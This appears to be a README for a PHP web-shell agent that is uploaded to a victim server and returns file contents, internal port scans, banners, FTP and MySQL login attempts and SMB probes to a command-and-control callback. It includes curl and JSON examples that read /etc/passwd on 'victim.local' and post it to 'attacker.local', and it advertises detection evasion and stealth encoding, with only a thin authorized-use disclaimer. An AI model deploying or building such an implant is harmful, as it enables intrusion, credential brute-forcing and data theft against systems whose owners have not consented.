# PHP Network Utility Script

This PHP script provides a JSON-controlled HTTP interface for performing a variety of system and network enumeration tasks using built-in PHP functions. It is designed for controlled environments such as penetration testing labs or internal audits.

> ⚠️ **Important:** This tool is intended for educational or authorized security testing in controlled environments only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

---

## Features

- Utilize built-in PHP functions to evade detection
- File and directory inspection (`readfile`, `scandir`)
- Port scanning on internal hosts (`portscan`)
- HTTP(S) content fetching (`http_get`)
- DNS resolution and PTR lookup (`dns_lookup`)
- Banner grabbing for FTP and SSH (`ftp_banner`, `ssh_banner`)
- Basic login attempts for FTP and MySQL (`ftp_login`, `mysql_login`)
- SMB probe using raw TCP (`smb_probe`)
- GZIP + Base64 encoding for stealth and compression

---

## Usage

### 1. Upload the Script

Place the script on a PHP-enabled web server (e.g., `/var/www/html/agent.php`).

### 2. Send a JSON Request

Send a `POST` request with the required JSON fields:

- `action`: One of the supported operations
- `target`: Internal hostname, IP, or file path (context-sensitive)
- `callback`: URL to receive the result via POST (C2 server)

Optional fields for some modules:

- `username`, `password`: Used in `ftp_login` or `mysql_login`
- `directory`: Used in `ftp_login`

### Example `curl` Usage

```bash
curl -X POST http://victim.local/agent.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "portscan",
    "target": "internal.local:22",
    "callback": "http://attacker.local/server.php"
}'
```

### Supported Actions

| Action         | Description                                      | Required Fields                             | Optional Fields                        |
|----------------|--------------------------------------------------|----------------------------------------------|----------------------------------------|
| `readfile`     | Reads contents of a file                         | `action`, `target`, `callback`               | –                                      |
| `scandir`      | Lists contents of a directory                    | `action`, `target`, `callback`               | –                                      |
| `portscan`     | Checks if a TCP port is open                     | `action`, `target` (`host:port`), `callback` | –                                      |
| `http_get`     | Makes HTTP(S) GET request, ignores SSL errors    | `action`, `target`, `callback`               | –                                      |
| `dns_lookup`   | Resolves hostname or does reverse lookup         | `action`, `target`, `callback`               | –                                      |
| `ftp_banner`   | Connects to FTP server and reads banner          | `action`, `target`, `callback`               | –                                      |
| `ssh_banner`   | Connects to SSH server and reads banner          | `action`, `target`, `callback`               | –                                      |
| `mysql_login`  | Attempts MySQL login without database access     | `action`, `target`, `username`, `callback`   | `password`                             |
| `ftp_login`    | Attempts FTP login and lists a directory         | `action`, `target`, `callback`               | `username`, `password`, `directory`    |
| `smb_probe`    | Sends probe to SMB port and captures raw reply   | `action`, `target`, `callback`               | –                                      |

## Configuration

- **C2 Hosting**: Deploy the `server.php` script on a PHP-enabled web server.
- **Victim**: Upload to a known, web-accessible directory.
- **Issue Request**: JSON POST requests with the following structure:
  ```json
  {
    "action": "readfile",
    "target": "/etc/passwd",
    "callback": "http://attacker.local/server.php"
  }

### Notes
- This script is designed to use only built-in PHP functions—no external binaries or system shell calls—making it stealthier in restricted environments.
- All actions run filelessly and are sandbox-safe unless explicitly used to write/upload content elsewhere.
- Ensure your web server has permissions to read targets (files, dirs, sockets).

### License
This tool is provided "as-is" for legal and educational use. You are responsible for complying with all laws and regulations applicable in your jurisdiction.
